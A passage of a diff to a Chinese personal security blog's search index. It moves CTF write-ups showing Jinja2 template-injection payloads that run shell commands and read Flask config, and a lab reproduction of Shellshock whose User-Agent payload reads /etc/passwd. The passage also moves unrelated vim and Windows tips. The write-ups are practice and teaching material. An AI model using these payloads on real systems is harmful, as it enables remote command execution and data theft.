+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>方法3</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>方法4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Jinjia2</tag>
+        <tag>Flask</tag>
       </tags>
   </entry>
   <entry>
@@ -3440,41 +3475,6 @@
       <tags>
         <tag>RCE</tag>
         <tag>PHP之科学计数法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bugku_SSTI_2</title>
-    <url>/2022/04/05/bugku_SSTI_2/</url>
-    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/203.html</p>
-<span id="more"></span>
-<h1 id="题目信息">1 题目信息</h1>
-<p>进入环境。得到提示信息 <code>You need pass in a parameter named flag</code>。又因为题目带有SSTI，根据决策树</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
-<p>直接尝试如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # 结果：$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # 结果：49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果：7777777</span><br></pre></td></tr></table></figure></p>
-<p>因此判断模板引擎是Jinjia2或者是flask。</p>
-<h1 id="解题">2 解题</h1>
-<p>输入如下payload： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>从中找出如下可用的子类： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>接下来共有4种方法</p>
-<ul>
-<li><p>方法1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
-<li><p>方法2</p></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>方法3</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>方法4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>Jinjia2</tag>
-        <tag>Flask</tag>
       </tags>
   </entry>
   <entry>
@@ -3560,24 +3560,32 @@
       </tags>
   </entry>
   <entry>
-    <title>vim缩进问题</title>
-    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
+    <title>windows 上CD驱动器的删除问题</title>
+    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
 <span id="more"></span>
 <h1 id="问题描述">问题描述</h1>
-<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
-<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
-<h1 id="解决方案">解决方案</h1>
-<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
-<p>然后就可以成功运行脚本了。</p>
-<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
+<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
+<p>删除也删不掉，打开也打开不了，很烦。</p>
+<h1 id="原因">原因</h1>
+<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
+<p>知道原因后，解决的办法就很简单了。</p>
+<h1 id="问题解决">问题解决</h1>
+<p>首先，以管理员方式打开 <code>UltraISO</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
+<p><code>选项 -&gt; 配置</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
+<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
+<p>然后即可看到 CD驱动器已经消失了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
 ]]></content>
       <categories>
-        <category>Linux</category>
+        <category>Windows</category>
       </categories>
       <tags>
-        <tag>vim</tag>
+        <tag>Windows小知识</tag>
       </tags>
   </entry>
   <entry>
@@ -3906,6 +3914,27 @@
       </tags>
   </entry>
   <entry>
+    <title>vim缩进问题</title>
+    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
+<span id="more"></span>
+<h1 id="问题描述">问题描述</h1>
+<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
+<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
+<h1 id="解决方案">解决方案</h1>
+<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
+<p>然后就可以成功运行脚本了。</p>
+<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>vim</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反序列化知识点</title>
     <url>/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
     <content><![CDATA[<p>个人总结的知识点，持续更新。</p>
@@ -4026,35 +4055,6 @@
       </tags>
   </entry>
   <entry>
-    <title>windows 上CD驱动器的删除问题</title>
-    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
-<span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
-<p>删除也删不掉，打开也打开不了，很烦。</p>
-<h1 id="原因">原因</h1>
-<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
-<p>知道原因后，解决的办法就很简单了。</p>
-<h1 id="问题解决">问题解决</h1>
-<p>首先，以管理员方式打开 <code>UltraISO</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
-<p><code>选项 -&gt; 配置</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
-<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
-<p>然后即可看到 CD驱动器已经消失了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Windows小知识</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
     <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
     <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
@@ -4139,6 +4139,34 @@
       </tags>
   </entry>
   <entry>
+    <title>复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）</title>
+    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
+<p>参考链接： - https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
+<p>影响版本： - bash version &lt;= 4.3</p>
+<p>路径： - <code>vulhub-master/bash/shellshock</code></p>
+<p>启动环境： - <code>sudo docker-compose up -d</code> - 输入 <code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
+<p>直接访问<code>http://192.168.100.16:8080/victim.cgi</code>，得到如下界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
+<p>此时，往HTTP头部的<code>User-Agent</code>写入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
+<p>同样的，对<code>safe.cgi</code>做一样的过程，发现没有任何事发生</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>破壳漏洞</tag>
+        <tag>shellshock</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
     <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
     <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
@@ -4187,34 +4215,6 @@
       </categories>
       <tags>
         <tag>AppWeb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）</title>
-    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
-<p>参考链接： - https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
-<p>影响版本： - bash version &lt;= 4.3</p>
-<p>路径： - <code>vulhub-master/bash/shellshock</code></p>
-<p>启动环境： - <code>sudo docker-compose up -d</code> - 输入 <code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
-<p>直接访问<code>http://192.168.100.16:8080/victim.cgi</code>，得到如下界面</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
-<p>此时，往HTTP头部的<code>User-Agent</code>写入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
-<p>同样的，对<code>safe.cgi</code>做一样的过程，发现没有任何事发生</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>破壳漏洞</tag>
-        <tag>shellshock</tag>
       </tags>
   </entry>
   <entry>
@@ -4340,35 +4340,6 @@
       </tags>
   </entry>
   <entry>
-    <title>攻防世界_shrine</title>
-    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
-    <content><![CDATA[<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>第一，由<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>，知道flag在<code>app.config['FLAG']</code>里；</li>
-<li>第二可以访问/shrine/xxx；</li>
-<li>第三，<code>(, ), config, self</code>被禁用，那么传统的模板注入就不行了。</li>
-</ul>
-<p>查看是否存在SSTI：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # 结果 $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # 结果 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果 7777777</span><br></pre></td></tr></table></figure>
-<p>存在SSTI，并且模板引擎为Jinjia2或者flask。</p>
-<h1 id="解题">解题</h1>
-<p>这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。</p>
-<p>读取内容。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>直接得到flag：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>Jinjia2</tag>
-        <tag>Flask</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网鼎杯 2018 Fakebook</title>
     <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -4424,6 +4395,35 @@
       <tags>
         <tag>反序列化</tag>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界_shrine</title>
+    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
+    <content><![CDATA[<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>第一，由<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>，知道flag在<code>app.config['FLAG']</code>里；</li>
+<li>第二可以访问/shrine/xxx；</li>
+<li>第三，<code>(, ), config, self</code>被禁用，那么传统的模板注入就不行了。</li>
+</ul>
+<p>查看是否存在SSTI：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # 结果 $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # 结果 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果 7777777</span><br></pre></td></tr></table></figure>
+<p>存在SSTI，并且模板引擎为Jinjia2或者flask。</p>
+<h1 id="解题">解题</h1>
+<p>这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。</p>
+<p>读取内容。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>直接得到flag：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Jinjia2</tag>
+        <tag>Flask</tag>
       </tags>
   </entry>
   <entry>
